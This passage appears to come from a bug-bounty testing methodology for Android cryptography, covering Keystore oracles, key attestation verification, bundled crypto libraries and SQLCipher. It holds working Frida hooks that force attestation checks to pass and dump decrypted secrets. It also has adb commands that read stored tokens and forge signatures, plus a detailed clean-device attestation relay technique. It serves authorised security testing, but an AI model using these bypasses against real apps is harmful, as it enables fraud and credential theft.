- **Test:** Key material can be perfectly protected while the *capability* is fully delegated. Find every
  path that performs a Keystore operation on caller-supplied input and reach it from another app.
- **How:**
```bash
# crypto sinks whose callers are IPC entry points
grep -rn -B12 'Cipher\.getInstance\|Signature\.getInstance\|Mac\.getInstance\|\.doFinal(\|\.sign()' out/sources/ \
  | grep -nE 'onReceive|onBind|onStartCommand|onHandleIntent|@JavascriptInterface|onCreate\(Bundle|call\(|query\(|openFile\('
# and the exported components that reach them
grep -n 'android:exported="true"' AndroidManifest.xml -B4 -A8
```
```bash
# drive it from an unprivileged caller
adb shell am broadcast -a com.target.app.DECRYPT --es blob "$(cat ct.b64)" -n com.target.app/.CryptoReceiver
adb shell am startservice -n com.target.app/.CryptoService --es op sign --es data 'transfer:9999:acct_attacker'
adb shell content call --uri content://com.target.app.crypto --method decrypt --arg "$(cat ct.b64)"
```
- **Proof:** An unprivileged app (or `adb` acting as one) submitting ciphertext over IPC and receiving the
  plaintext back, or submitting arbitrary data and receiving a valid signature under the app's key — with
  the returned value shown and, for the signature, accepted by the server.
- **Escalation:** → D05/D06/D07 for the component finding, D15/D23 for the forged signature. Per the
  chain-filing rule, file the exported component as the primitive and this as the consumer, then backfill
  the links.
- **Ruled out when:** Every crypto-performing path is behind a signature-level permission or a non-exported
  component, **or** the key it uses requires per-operation user authentication so the oracle cannot be
  driven silently. A `drozer`/`am` sweep that returns permission denials on every path is the negative —
  record the commands.

### D12-059 · `KeyStoreManager.grantKeyAccess()` (Android 16) — a Keystore key shared to another UID

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1) when the shared key signs authentication assertions; `sensitive_data_exposure.disclosure_of_secrets.for_internal_asset` (P3) otherwise |
| **Attacker** | AM-08 / AM-03 (the grantee) |
| **Applies to** | **Android 16 (API 36)+**. New enough that essentially no public checklist covers it — grep for it on every Android-16-targeting app |
| **Maps to** | `developer.android.com/about/versions/16/features` — `KeyStoreManager`, `grantKeyAccess(String, int)`, `revokeKeyAccess(String, int)`, "Share access to Android Keystore keys with other apps" |

- **Test:** Any grant widens the key's trust boundary. A grant to a UID the app does not control, or a
  grant that is never revoked on teardown, is the finding.
- **How:**
```bash
grep -rn 'KeyStoreManager\|grantKeyAccess\|revokeKeyAccess' out/sources/ -B6 -A6
```
```javascript
Java.perform(function () {
  var KSM = Java.use('android.security.keystore.KeyStoreManager');
  KSM.grantKeyAccess.overload('java.lang.String','int').implementation = function (alias, uid) {
    console.log('[keygrant] alias=' + alias + ' uid=' + uid); return this.grantKeyAccess(alias, uid); };
  KSM.revokeKeyAccess.overload('java.lang.String','int').implementation = function (alias, uid) {
    console.log('[keyrevoke] alias=' + alias + ' uid=' + uid); return this.revokeKeyAccess(alias, uid); };
});
```
```bash
adb shell dumpsys package | grep -B2 "userId=<uid>"      # resolve the uid to a package
```
- **Proof:** Hook output showing a grant of a signing or encryption alias to a third-party package's uid,
  with no matching `revokeKeyAccess` on teardown — plus that package's identity resolved by name.
- **Escalation:** → D13 (the grantee can produce valid signatures indefinitely), D18 if the grantee is an
  SDK.
- **Ruled out when:** No reference to `KeyStoreManager` in the app or its dependencies, or every grant is
  to a UID the vendor controls (same signing certificate, verified via `dumpsys package` signatures) and is
  revoked in the corresponding teardown path.

### D12-060 · `EncryptedSharedPreferences` / `MasterKey` present but the master key is not auth-bound

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | `insecure_data_storage.sensitive_application_data_stored_unencrypted.on_internal_storage` (**P5**) as filed naively — rate the consequence instead |
| **Attacker** | AM-08/AM-03 with an in-process or read primitive |
| **Applies to** | all; Jetpack Security's `EncryptedSharedPreferences` is **deprecated as of 1.1.0** and Google advises against it in new apps |
| **Maps to** | MASWE-0003, MASWE-0016; the D12-004 alias table |

- **Test:** "It uses `EncryptedSharedPreferences`" is not an answer. Encrypted-at-rest is defeated by any
  in-process primitive if the master key requires nothing. Verify the master key's `KeyGenParameterSpec`
  rather than declaring the store safe.
- **How:**
```bash
grep -rn 'EncryptedSharedPreferences\|MasterKey\|MasterKeys\|EncryptedFile' out/sources/ -A12 \
  | grep -nE 'setUserAuthenticationRequired|setInvalidatedByBiometricEnrollment|setUserAuthenticationValidityDurationSeconds|setUnlockedDeviceRequired|AES256_GCM'
```
```javascript
Java.perform(function () {
  var ESP = Java.use('androidx.security.crypto.EncryptedSharedPreferences');
  ESP.getString.overload('java.lang.String','java.lang.String').implementation = function (k, d) {
    var v = this.getString(k, d); console.log('[ESP] ' + k + ' = ' + v); return v; };
});
```
- **Proof:** Frida printing the plaintext token out of the encrypted store on a device that is merely
  unlocked, with no prompt — plus the master key's `userAuthRequired=false` row from the D12-004 table.
- **Escalation:** → D11 (with a demonstrated read primitive this becomes High), D13.
- **Ruled out when:** The `MasterKey` is built with `setUserAuthenticationRequired(true)` and the getter
  throws `UserNotAuthenticatedException` under the direct-call test. Note the deprecation in the report as
  a maintenance observation, not as a finding.

### D12-061 · Keying material not cleared on logout or account removal

| | |
|---|---|
| **Severity ceiling** | Low |
| **VRT** | `cryptographic_weakness.incomplete_cleanup_of_keying_material` (**P5**, CWE-459); `insecure_os_firmware.failure_to_remove_sensitive_artifacts_from_disk` (varies); `broken_authentication_and_session_management.failure_to_invalidate_session.on_logout` (P4) |
| **Attacker** | AM-11 / AM-03 with a read primitive |
| **Applies to** | all, especially E2EE messaging and vault apps |
| **Maps to** | H1 #1189168 (Nextcloud, "Android app does not clear end to end encryption keys", **$100**) against H1 #1189162 (Nextcloud, "End to end encryption public key is not properly verified", **$1,500**) — the verification failure is worth fifteen times the hygiene failure |

- **Test:** Keys, passphrases and wrapped blobs that survive an explicit logout. This is P5 on its own;
  its value is as a supporting fact under a real finding.
- **How:**
```bash
adb shell run-as com.target.app sh -c 'ls -laR files shared_prefs databases no_backup' > before.txt
# log out in the app, then:
adb shell run-as com.target.app sh -c 'ls -laR files shared_prefs databases no_backup' > after.txt
diff before.txt after.txt
adb shell run-as com.target.app sh -c 'cat shared_prefs/*.xml' | grep -iE 'key|token|passphrase'
grep -rn 'deleteEntry(\|\.remove(\|clear()' out/sources/ -B6 | grep -in 'logout\|signOut\|wipe'
```
- **Proof:** The private key, passphrase or wrapped blob still present and still usable after an explicit
  logout — demonstrated by decrypting with it post-logout.
- **Escalation:** Attach it to D12-076 (the E2EE verification finding) or to a D11/D13 session finding. On
  its own it is **P5** — never present it as a standalone report.
- **Ruled out when:** `KeyStore.deleteEntry()` is called for every alias on logout (confirm the alias list
  is empty afterwards via D12-004) and the diff shows the key files removed.

### D12-062 · No StrongBox request and no attestation verification — the fair comment on any device

| | |
|---|---|
| **Severity ceiling** | Low |
| **VRT** | `cryptographic_weakness.insecure_implementation.missing_cryptographic_step` (varies) — realistically a hardening finding unless a server trusts a client assertion instead |
| **Attacker** | AM-12 (static observation) |
| **Applies to** | key attestation is **API 24+**; ID attestation **API 28+**; StrongBox **API 28+** |
| **Maps to** | the emulator-caveat rule — the only *fair* comment on any device is whether the app **requests** `setIsStrongBoxBacked(true)` and whether it **verifies** the attestation chain |

- **Test:** You cannot characterise hardware backing from an emulator, but you can always state, by
  `file:line`, that the app never asks for StrongBox and never generates or checks an attestation chain.
  That is a defensible observation; an emulator reading is not.
- **How:**
```bash
grep -rn 'setIsStrongBoxBacked\|FEATURE_STRONGBOX_KEYSTORE' out/sources/
grep -rn 'setAttestationChallenge\|getCertificateChain\|AttestationApplicationId\|X509Certificate\[\]' out/sources/
grep -rn '1\.3\.6\.1\.4\.1\.11129\.2\.1\.17' out/sources/          # the KeyDescription extension OID
grep -rn 'isInsideSecureHardware\|getSecurityLevel' out/sources/    # does the app even ask?
```
- **Proof:** The absence of a StrongBox request and the absence of any attestation-chain generation or
  verification, each cited by `file:line` — **not** an emulator reading.
- **Escalation:** No attestation verification **plus** a server that trusts a client-asserted
  "hardwareBacked" boolean is D12-063, which is a real finding; on its own this is Low hardening.
- **Ruled out when:** The app requests StrongBox behind a `FEATURE_STRONGBOX_KEYSTORE` probe and generates
  an attestation chain that leaves the device — in which case move to D12-063 onwards and test the
  verifier.

### D12-063 · Key attestation verified on the client instead of on a server

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `cryptographic_weakness.insufficient_verification_of_data_authenticity.cryptographic_signature` (varies); exit to `broken_authentication_and_session_management.authentication_bypass` (P1) when it gates enrolment |
| **Attacker** | AM-12 for the bypass demonstration, AM-01 for the consequence |
| **Applies to** | all apps using key attestation |
| **Maps to** | `developer.android.com/privacy-and-security/security-key-attestation` — "Perform verification on a **separate server**, not on the device itself"; the requirements list (root signed with the Google attestation root key, `attestationSecurityLevel` of `TrustedEnvironment` or `StrongBox`, all signatures verified, no certificate in the CRL, "Validation performed on trusted server, not on device"); the official verifier at github.com/android/keyattestation |

- **Test:** The whole point of attestation is that the device may be compromised. Verification performed
  in the app — parsing the chain in Java/Kotlin and branching locally — is defeated by one Frida line.
- **How:**
```bash
grep -rn 'setAttestationChallenge\|getCertificateChain\|attestationSecurityLevel\|1\.3\.6\.1\.4\.1\.11129\.2\.1\.17' out/sources/
```
  Then decide it empirically: does the DER-encoded chain appear in an outbound request in Burp, or only a
  boolean?
```javascript
Java.perform(function () {
  var V = Java.use('com.target.app.security.AttestationVerifier');
  V.isDeviceTrustworthy.implementation = function () { return true; };
  var KI = Java.use('android.security.keystore.KeyInfo');
  try { KI.isInsideSecureHardware.implementation = function () { return true; }; } catch (e) {}
});
```
- **Proof:** A Burp capture showing the client sending `{"hardwareBacked": true}` — a client assertion —
  rather than the certificate chain, and the server accepting it; then flip the boolean and show the server
  still accepts. Or, with the hook, attestation-gated functionality unlocking on a rooted or emulated
  device.
- **Escalation:** → D21 (full RASP bypass), D23 (fraud controls that rested on it). The device-integrity
  control is decorative and every downstream decision built on it is void.
- **Ruled out when:** The full DER chain leaves the device on every enrolment and the server's response
  changes when you tamper with the chain — verified by submitting a chain with a modified
  `attestationSecurityLevel` and observing a distinct rejection body.

### D12-064 · Attestation challenge not bound to a fresh server nonce (replay)

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1) when attestation gates enrolment or payment provisioning; `cryptographic_weakness.insufficient_verification_of_data_authenticity.cryptographic_signature` (varies) otherwise |
| **Attacker** | AM-01 |
| **Applies to** | all attestation deployments |
| **Maps to** | `developer.android.com/privacy-and-security/security-key-attestation` verification checklist item "`attestationChallenge` matches your nonce"; `KeyDescription.attestationChallenge` in source.android.com/docs/security/features/keystore/attestation |

- **Test:** `setAttestationChallenge()` must carry a fresh, server-issued, single-use value. A constant, a
  client-generated UUID or a timestamp means one genuine attestation can be replayed forever — including
  from an emulator or from a different device entirely.
- **How:**
```bash
grep -rn -B6 -A6 'setAttestationChallenge(' out/sources/    # is the argument a constant, a UUID, a timestamp?
```
  Capture two enrolments and diff the challenge; then replay a previously captured chain from a different
  install:
```bash
diff <(jq -r '.attestationChallenge' enrol1.json) <(jq -r '.attestationChallenge' enrol2.json)
curl -s -X POST https://api.target/v1/enrol -H 'Content-Type: application/json' -d @enrol1.json
```
- **Proof:** Two enrolment requests carrying an identical `attestationChallenge`, and a third enrolment
  succeeding after replaying a captured chain from a different device — with the server's success body
  shown.
- **Escalation:** → D21 (provision the app on an unauthorised or emulated device), D23 (payment
  provisioning).
- **Ruled out when:** Each enrolment's challenge differs, is server-issued (visible as a preceding
  challenge-fetch request), and a replay of a previously used challenge is rejected with a distinct body.

### D12-065 · Attestation extension read from the wrong certificate in the chain

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1) |
| **Attacker** | AM-01 |
| **Applies to** | every server that consumes Android key attestation |
| **Maps to** | `developer.android.com/privacy-and-security/security-key-attestation`, verbatim: "**Critical**: Only trust the **first occurrence** of the extension (nearest to root). Extensions in the leaf certificate may have been added by attackers"; and "Don't assume the key attestation extension is in the leaf certificate" |

- **Test:** If the server does verify, check *which* certificate it parses the extension from. Trusting the
  leaf lets anyone who can mint a leaf inject arbitrary claims — security level, boot state, application id.
- **How:**
```bash
# split the chain and show which certificates carry the extension
openssl crl2pkcs7 -nocrl -certfile chain.pem | openssl pkcs7 -print_certs -out certs.pem
csplit -z -f cert- certs.pem '/-----BEGIN CERTIFICATE-----/' '{*}'
for c in cert-*; do echo "== $c"; openssl x509 -in $c -text -noout | grep -c '1.3.6.1.4.1.11129.2.1.17'; done
```
  Then submit a chain with an attacker-added leaf carrying a forged `KeyDescription` and see whether the
  server honours it. Newer chains also carry a CBOR **provisioning information** extension that must be
  parsed before the attestation extension in the following certificate — a verifier that stops at the first
  certificate without accounting for it will read the wrong one.
- **Proof:** The server accepting an attestation whose `securityLevel` or `verifiedBootState` came from an
  attacker-controlled certificate.
- **Escalation:** Impersonate a genuine locked device to the backend → D21, D23.
- **Ruled out when:** The server rejects a chain whose leaf carries a forged extension while the
  root-nearest occurrence says otherwise — or the verifier is the official
  `github.com/android/keyattestation` library at a current version.

### D12-066 · `attestationSecurityLevel` `SOFTWARE` accepted, or no CRL check

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `cryptographic_weakness.insufficient_verification_of_data_authenticity.cryptographic_signature` (varies); `cryptographic_weakness.use_of_expired_cryptographic_key_or_cert` (P4) for the expiry half |
| **Attacker** | AM-01 |
| **Applies to** | all attestation verifiers |
| **Maps to** | `developer.android.com/privacy-and-security/security-key-attestation` — CRL at `https://android.googleapis.com/attestation/status` with `status` values `REVOKED`/`SUSPENDED` and `reason` values `UNSPECIFIED`/`KEY_COMPROMISE`/`CA_COMPROMISE`/`SUPERSEDED`/`SOFTWARE_FLAW`; root list at `https://android.googleapis.com/attestation/root`; `attestationSecurityLevel` ∈ `SOFTWARE`/`TRUSTED_ENVIRONMENT`/`STRONGBOX`; `SecurityLevel` `Software` means only "secure as long as the device's Android system complies with the Android Platform Security Model" |

- **Test:** Verifiers commonly (a) skip the revocation list, (b) accept `attestationSecurityLevel = SOFTWARE`,
  and (c) do not check certificate validity at all.
- **How:**
```bash
curl -s https://android.googleapis.com/attestation/status | jq '.entries | keys | length'
curl -s https://android.googleapis.com/attestation/root -o roots.pem
openssl x509 -in leaf.pem -text -noout | grep -A25 '1.3.6.1.4.1.11129.2.1.17'
openssl crl2pkcs7 -nocrl -certfile chain.pem | openssl pkcs7 -print_certs -text -noout | grep -E 'Not After|Serial'
```
  Then submit: a chain whose leaf claims `SOFTWARE` (an emulator produces one for free), and a chain whose
  serial is present in the CRL.
- **Proof:** The backend returning "attested / trusted" for a chain with `SOFTWARE` security level or with
  a revoked serial — with both request and response bodies in the report.
- **Escalation:** → D21/D15. An attestation accepted from a device with no hardware root of trust defeats
  every downstream anti-fraud control.
- **Ruled out when:** The backend rejects `SOFTWARE` chains and CRL-listed serials with distinct bodies,
  and the chain terminates at a certificate in the published root list. **The emulator is the ideal source
  of a `SOFTWARE` chain for this test — that is the one legitimate use of the artefact D12-077 forbids you
  from reporting.**

### D12-067 · `RootOfTrust` present and ignored — `deviceLocked` / `verifiedBootState`

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `cryptographic_weakness.insufficient_verification_of_data_authenticity.cryptographic_signature` (varies) |
| **Attacker** | AM-01 (from a bootloader-unlocked device) |
| **Applies to** | **Android 7.0+** for the fields; **Android 10+** for the VBMeta digest |
| **Maps to** | source.android.com/docs/security/features/keystore/attestation — `RootOfTrust` contains `verifiedBootKey`, `deviceLocked`, `verifiedBootState` (`Verified`, `SelfSigned`, `Unverified`, `Failed`), `verifiedBootHash`; AOSP security-model §4.7: "the Verified Boot state is included in key attestation certificates … in the `deviceLocked` and `verifiedBootState` fields, which can be verified by apps as well as passed onto backend services to remotely verify boot integrity"; from Android 10 with AVB2 "the VBMeta struct digest … is included in key attestation certificates to support firmware transparency" |

- **Test:** A verified attestation carries the boot state. Check that the server actually gates on it — an
  unlocked bootloader (`deviceLocked=false`, `verifiedBootState` `Unverified`/`SelfSigned`) is precisely
  the case the app should treat differently, and it is the state your test device is probably in.
- **How:**
```bash
openssl x509 -in leaf.pem -text -noout | grep -A40 '1.3.6.1.4.1.11129.2.1.17'
adb shell getprop ro.boot.verifiedbootstate; adb shell getprop ro.boot.flash.locked
# submit an attestation from a bootloader-unlocked device to a high-value action
curl -s -X POST https://api.target/v1/provision -H 'Content-Type: application/json' -d @chain_unlocked.json
```
- **Proof:** An attestation from a bootloader-unlocked device with `deviceLocked=false` being accepted for a
  high-value action, with the extension dump showing the field and the server's success body beside it.
- **Escalation:** Run the app's privileged flows on a fully attacker-controlled device → D21, D23.
- **Ruled out when:** The backend rejects `deviceLocked=false` / non-`Verified` boot states for privileged
  actions with a distinct body. Note the app's *own* claim: if the vendor's model does not assert device
  binding, negotiate the severity rather than dropping the finding.

### D12-068 · `attestationApplicationId` [709] not checked — the clean-device relay

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1) when the relayed attestation gates enrolment |
| **Attacker** | AM-11/AM-12 for the relay, AM-01 for the consequence |
| **Applies to** | apps that treat an Android Keystore X.509 attestation chain as a device-integrity boolean |
| **Maps to** | HackTricks `play-integrity-attestation-bypass.md` "Hardware Attestation Clean-Device Relay", citing the Quarkslab research and demo repository, Guardsquare's key-attestation relay work, and the AOSP key/ID attestation docs |

- **Test:** The extension proves that *some* acceptable TEE/StrongBox generated the leaf key for that
  challenge. It does **not** bind that hardware to the process or the network session presenting the chain.
  Signature validation, Google-root pinning, freshness, revocation, security level, `deviceLocked=true` and
  `verifiedBootState=Verified` can all pass on relayed evidence, because the claims are genuine — for the
  *oracle phone*.
- **How:** Instrument the rooted target, capture the backend's raw challenge before local key generation,
  re-encode it as unpadded Base64URL (`android.util.Base64` `NO_PADDING | NO_WRAP | URL_SAFE` = `1 | 2 | 8`),
  POST `{"nonce":"..."}` to a stock locked phone, have that phone generate an ephemeral `secp256r1`
  AndroidKeyStore signing key with SHA-256 and `.setAttestationChallenge(challenge)` (StrongBox if
  required), export `KeyStore.getCertificateChain(alias)` as Base64 DER, and inject that chain back into
  the target using the exact application-specific return type.
  - **Do not call the original local method** — the rooted phone then generates its own failing `RootOfTrust`.
  - Hook the highest-level method that accepts a `ByteArray` and returns the app's attestation wrapper; if
    none exists, hook `KeyGenParameterSpec.Builder.setAttestationChallenge(byte[])` on input and
    `java.security.KeyStore.getCertificateChain(String)` on output, tracking alias and per-request context
    so concurrent generations cannot be mispaired.
  - The controller must **always** post a `response` (even an empty array after an HTTP error) or `op.wait()`
    deadlocks the app thread.
```bash
grep -rn 'attestationApplicationId\|\[709\]\|709' out/sources/ | head        # does anything parse tag 709?
```
- **Proof:** The backend accepting an attestation chain generated on a different, clean device while the app
  runs on a rooted one.
- **Escalation:** The backend fixes to recommend are the finding's remediation section: require a signature
  over fresh **session-, challenge- and transaction-specific** data (forcing the attacker to proxy every
  signing operation, not merely the initial chain), and parse `attestationApplicationId` (authorization tag
  **[709]**), comparing the package name and the SHA-256 signing-certificate digest against independently
  configured expected values.
- **Ruled out when:** The server parses tag [709] and rejects a chain whose application id does not match
  the expected package and signing digest, **and** every privileged operation requires a fresh signature
  under the attested key rather than a one-time chain submission.

### D12-069 · Attestation root rotation and RKP certificate lifetimes

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `cryptographic_weakness.use_of_expired_cryptographic_key_or_cert` (P4) for accepting expired RKP chains; `.insufficient_verification_of_data_authenticity.cryptographic_signature` (varies) |
| **Attacker** | AM-01 |
| **Applies to** | attestation verifiers; device-side behaviour differs on **Android 15** (RKP optional) versus **Android 16** (RKP only, factory keys phased out) |
| **Maps to** | `developer.android.com/privacy-and-security/security-key-attestation` — a new EC-based root certificate signs attestation chains starting **1 February 2026**, alongside the existing root with `SERIALNUMBER=f92009e853b6b045` (valid 2022-03-20 to 2042-03-15); "Android 15+: RKP support is optional. Android 16+: Only RKP is supported; factory keys are phased out"; "RKP certificates must have validity periods checked"; "Pre-2021 devices have attestation keys with expired certificates, but remain trustworthy unless in the CRL" |

- **Test:** Two moving parts. A verifier that pins only the old root is about to break; a verifier that
  skips validity checks "because pre-2021 devices have expired factory keys anyway" is already accepting
  stale chains — and RKP certificates have deliberately short validity, where "the shorter expiration is
  part of the threat model".
- **How:**
```bash
curl -s https://android.googleapis.com/attestation/root -o roots.pem
openssl crl2pkcs7 -nocrl -certfile chain.pem | openssl pkcs7 -print_certs -text -noout | grep -E 'Not After|Serial|Issuer'
# submit two chains: one from an Android 16 device (RKP, short-lived leaf) and one from a pre-2021 device
```
- **Proof:** Either the verifier **rejects a legitimate Android 16 RKP chain** (an availability finding), or
  it **accepts an expired RKP chain** (the security finding — it defeats the revocation model). The second
  is the one to lead with.
- **Escalation:** → D21.
- **Ruled out when:** The verifier's trust list contains both the `f92009e853b6b045` root and the new EC
  root, it enforces `notAfter` on every certificate in the chain, and it distinguishes an expired *RKP*
  certificate (reject) from an expired *pre-2021 factory* certificate (accept unless CRL-listed).

### D12-070 · Explicitly named JCA provider, and bundled BouncyCastle re-registered

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | `cryptographic_weakness.broken_cryptography.use_of_vulnerable_cryptographic_library` (P4) |
| **Attacker** | AM-01 |
| **Applies to** | apps targeting **Android 9 (API 28)+ fail** when a provider is specified. The `Crypto` provider was deprecated in **Android 7.0 (API 24)** and removed in **Android 9 (API 28)**; **BouncyCastle** was deprecated in Android 9 and removed in **Android 12 (API 31)** — flag BKS keystore use as **LEGACY** |
| **Maps to** | MASTG-TEST-0312, MASWE-0007, MASTG-KNOW-0011 (Security Provider), MASTG-BEST-0020, rule `mastg-android-hardcoded-security-provider` |

- **Test:** Naming a provider is a compatibility and a security problem: providers have been removed, the
  call can silently fall back or throw, and bundling a legacy provider restores primitives the platform
  refuses.
- **How:**
```bash
semgrep -c rules/mastg-android-hardcoded-security-provider.yaml out/sources/
grep -rnE 'getInstance\([^)]*,\s*"(BC|BouncyCastle|Crypto|SC|SunJCE|Conscrypt|AndroidOpenSSL)"' out/sources/
grep -rn 'Security\.addProvider\|Security\.insertProviderAt\|KeyStore\.getInstance\("BKS"\)' out/sources/
unzip -l base.apk | grep -iE 'bcprov|bcpkix|spongycastle'
unzip -p base.apk 'META-INF/*.version' | grep -i -A1 -B1 castle
```
- **Proof:** The `getInstance(..., "<provider>")` call site with a provider other than `AndroidKeyStore` on
  a `KeyStore` call, **plus** the bundled provider's version and the weak primitive it actually supplies.
- **Escalation:** A bundled crypto library shipping its own provider is also a D17 supply-chain item —
  check the coordinate against OSV/GHSA. Weak provider → weak primitive → D12-014/D12-015.
- **Ruled out when:** Every `getInstance` is provider-less (the maintained default is `AndroidOpenSSL` /
  Conscrypt) except `KeyStore.getInstance("AndroidKeyStore")`. **Rating honesty:** on its own this is often
  Informational under HackerOne rating — escalate only when the named provider is a known-weak one *and*
  you can show the resulting weak primitive in use.

### D12-071 · A provider inserted ahead of Conscrypt, opting the process out of Mainline fixes

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | `cryptographic_weakness.broken_cryptography.use_of_vulnerable_cryptographic_library` (P4) |
| **Attacker** | AM-06/AM-01 |
| **Applies to** | Conscrypt APEX from **Android 10**; Android 15 disallows TLS 1.0/1.1 for apps targeting it |
| **Maps to** | AOSP Conscrypt module — provides the TLS and JCA providers, embeds BoringSSL (NIST CMVP validated), ships as the `com.android.conscrypt` APEX and updates independently of OS releases |

- **Test:** Conscrypt is Mainline-updated. An app that inserts its own provider at position 1 opts out of
  those security updates for **every** crypto operation in the process, including TLS.
- **How:**
```bash
grep -rnE 'Security\.insertProviderAt|Security\.addProvider|new BouncyCastleProvider|org\.spongycastle|Conscrypt\.newProvider|removeProvider' out/sources/
unzip -l base.apk | grep -iE 'bcprov|spongycastle|conscrypt'
```
```javascript
Java.perform(function () {
  var S = Java.use('java.security.Security');
  var p = S.getProviders();
  for (var i = 0; i < p.length; i++) console.log(i + ': ' + p[i].getName() + ' ' + p[i].getVersion());
});
```
- **Proof:** The provider list with a shipped BouncyCastle at index 0 ahead of `AndroidOpenSSL`/Conscrypt,
  plus the bundled `bcprov` version being an old release with a citable advisory.
- **Escalation:** → D14 — the app's TLS behaviour now diverges from platform policy; its own provider may
  still negotiate TLS 1.0/1.1 that the platform refuses.
- **Ruled out when:** The provider list shows `AndroidOpenSSL`/Conscrypt at index 0, or the app installs
  Conscrypt explicitly via `Conscrypt.newProvider()` (a *correct* pattern — Google Play Services provider
  installation), not a bundled legacy provider.

### D12-072 · Bundled OpenSSL or SQLCipher crypto version

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | `cryptographic_weakness.broken_cryptography.use_of_vulnerable_cryptographic_library` (P4); `using_components_with_known_vulnerabilities.outdated_software_version` (**P5**) if you cannot show reachability |
| **Attacker** | AM-06/AM-09 |
| **Applies to** | all apps shipping native TLS/crypto |
| **Maps to** | Google Play "Remediation for Bad OpenSSL Versions" — **OpenSSL 1.1.1b through 1.1.1h** flagged as defective (ARMv8.3 PAC misuse causing runtime crashes), **resolved in 1.1.1i**; remediation is to update to 1.1.1i+ or use Java crypto (`HttpsURLConnection`) instead of the native interface, and updating the security provider alone does **not** fix it; the page names Agora RTM SDK, Alibaba, Amazon Chime SDK and Cocos2d-x as indirect embedders. Google's ASI programme also ran an OpenSSL campaign (from 2016-03-31) covering logjam, **CVE-2015-3194** and **CVE-2014-0224**, plus GnuTLS (2015-10-13), libpng and libjpeg-turbo (2016-06-16), and libupnp / **CVE-2015-8540** (2016-02-08). SQLCipher's bundled crypto has carried **CVE-2023-3446, CVE-2024-2511, CVE-2024-4741, CVE-2024-5535** (the last against OpenSSL 1.1.1q as used by SQLCipher 4.5.2) |

- **Test:** Extract the version string from the binary, not from the wrapper's version number — the
  SQLCipher release number tells you nothing about its embedded OpenSSL.
- **How:**
```bash
mkdir -p x && unzip -o base.apk 'lib/*' -d x
for so in $(find x/lib -name '*.so'); do
  v=$(strings -a "$so" | grep -aoE 'OpenSSL 1\.[0-9]\.[0-9][a-z]*|OpenSSL 3\.[0-9]+\.[0-9]+|openssl-1(\.[0-9])*[a-z]|BoringSSL' | sort -u | tr '\n' ' ')
  [ -n "$v" ] && echo "$so -> $v"
done
strings -a x/lib/*/libsqlcipher*.so | grep -aiE 'OpenSSL [0-9.]+[a-z]?|SQLCipher [0-9.]+' | sort -u
./gradlew :app:dependencies --configuration releaseRuntimeClasspath | grep -iE 'bouncycastle|bcprov|bcpkix|conscrypt|spongycastle|netcetera|3ds|sqlcipher'
./gradlew :app:dependencyInsight --configuration releaseRuntimeClasspath --dependency bcprov-jdk15to18
```
  Then prove reachability, which is what lifts it above P5:
```javascript
var m = Process.getModuleByName('libagora-rtc-sdk.so');
['SSL_connect','EVP_EncryptInit_ex'].forEach(function (s) {
  var a = Module.findExportByName(m.name, s);
  if (a) Interceptor.attach(a, { onEnter: function () { console.log('[reached] ' + s + ' in ' + m.name); } });
});
```
- **Proof:** The literal version string with the `.so` path it came from, **plus** a Frida hook showing the
  app actually routing crypto or TLS through that module, **plus** the OSV/GHSA record. For a transitive
  arrival, the `dependencyInsight` tree showing the crypto coordinate coming *through* the payment or 3DS
  SDK — Square's In-App Payments Buyer Verification SDK carried "a transitive dependency with a known
  critical security vulnerability originating from the Bouncy Castle cryptography library pulled in by the
  Netcetera 3DS SDK".
- **Escalation:** → D14 (TLS integrity), D16 (memory-safety CVEs in the same `.so`), D23 (payments).
  Argue a vendor-chain finding when the client cannot patch it directly.
- **Ruled out when:** Every embedded crypto library version is outside the published vulnerable ranges, or
  the module is present but demonstrably never loaded (`Process.enumerateModules()` after a full exercise
  of the app does not list it). A version string with no reachability evidence is **P5** — do not lead
  with it.

### D12-073 · SQLCipher passphrase recoverable — the "encrypted" database is decorative

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | rate the recovered plaintext: `sensitive_data_exposure.disclosure_of_secrets.*`, or `broken_authentication_and_session_management.authentication_bypass` (P1) if a session is inside |
| **Attacker** | AM-03 with a read primitive; AM-01 if the passphrase is a constant shared across installs |
| **Applies to** | apps using `android-database-sqlcipher` / `androidx-database-sqlcipher` |
| **Maps to** | cross-reference to D11; the passphrase derivation is the D12 half |

- **Test:** The encryption is only as strong as the passphrase source. A literal, a device-id derivation or
  a trivially-derived value makes at-rest encryption decorative.
- **How:**
```bash
grep -rn 'net\.sqlcipher\|SupportFactory(\|openOrCreateDatabase(\|getWritableDatabase("' out/sources/ -B6 -A6
grep -rn "SupportFactory(\|getBytes()\|openOrCreateDatabase(.*\"" out/sources/ | grep -i cipher
adb shell run-as com.target.app sh -c 'cat databases/app.db' > app.db
sqlcipher app.db <<'SQL'
PRAGMA key = '<recovered passphrase>';
PRAGMA cipher_compatibility = 4;
.tables
select * from sessions limit 5;
SQL
```
- **Proof:** `.tables` and a `select *` returning plaintext rows from the pulled encrypted database.
- **Escalation:** → D11 (the storage finding this voids), D13 (if session material is inside), D20 (chat
  history, health data).
- **Ruled out when:** The passphrase comes from an `AndroidKeyStore`-wrapped random value generated per
  install (two installs produce different keys) and `sqlcipher` refuses to open the pulled database with
  every candidate you derived from the APK.

### D12-074 · Offline DRM `keySetId` persisted without binding to the account or the entitlement

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.idor.modify_view_sensitive_information_guid` (P4) as filed literally; realistically rated as content/entitlement theft by the program |
| **Attacker** | AM-05 another user of the same app / AM-11 |
| **Applies to** | apps with offline download of DRM-protected media (Widevine `cenc` API 19+, `cbcs` API 25+) |
